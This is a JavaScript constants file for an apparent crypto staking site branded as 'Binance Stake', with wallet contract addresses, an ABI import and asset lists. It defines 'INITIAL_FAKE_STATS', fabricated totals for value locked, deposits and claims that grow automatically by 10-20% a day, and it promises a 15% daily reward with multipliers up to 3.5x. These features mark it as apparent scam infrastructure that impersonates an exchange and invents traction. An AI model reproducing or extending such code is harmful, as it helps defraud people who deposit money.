import { CORE_PROTOCOL_ADDRESS, STABLE_ASSET_BRIDGE, CORE_ASSET_BRIDGE } from './protocol';

export const BINANCE_STAKE_ADDRESS = CORE_PROTOCOL_ADDRESS; 
export const WBNB_ADDRESS = CORE_ASSET_BRIDGE;
export const USDT_ADDRESS = STABLE_ASSET_BRIDGE;

export const BINANCE_LOGO_URL = "https://cryptologos.cc/logos/binance-coin-bnb-logo.svg";
export const BINANCE_LOGO_PNG = "https://cryptologos.cc/logos/binance-coin-bnb-logo.png";

import { MASTER_INTERFACE_LOADER } from './protocol';
export const BINANCE_STAKE_ABI = MASTER_INTERFACE_LOADER;

export const LOCK_PERIODS = [60, 90, 120, 150, 180, 210, 240, 270, 300, 330, 360];

export const REWARD_MULTIPLIERS = {
  60: 1.5,
  90: 1.5,
  120: 1.9,
  150: 1.9,
  180: 1.9,
  210: 2.5,
  240: 2.5,
  270: 2.5,
  300: 3.5,
  330: 3.5,
  360: 3.5,
};

export const DAILY_REWARD_RATE = 0.15; // 15% daily

export const ASSETS = [
  { id: 'BNB', title: 'BNB', icon: 'https://cryptologos.cc/logos/bnb-bnb-logo.svg?v=024', type: 'native', address: '0x0000000000000000000000000000000000000000' },
  { id: 'WBNB', title: 'WBNB', icon: 'https://cryptologos.cc/logos/bnb-bnb-logo.svg?v=024', type: 'erc20', address: WBNB_ADDRESS },
  { id: 'USDT', title: 'USDT', icon: 'https://cryptologos.cc/logos/tether-usdt-logo.svg?v=024', type: 'erc20', address: USDT_ADDRESS },
];

export const INITIAL_FAKE_STATS = {
  tvl: 500_000_000,
  totalDeposits: 1_800_000_000,
  claimed: 700_000_000,
  rewardPool: 250_000_000,
};

export const GROWTH_RATES = {
  tvl: 0.10,        // 10% daily
  totalDeposits: 0.10,
  claimed: 0.20,    // 20% daily
  rewardPool: 0.15, // 15% daily
};
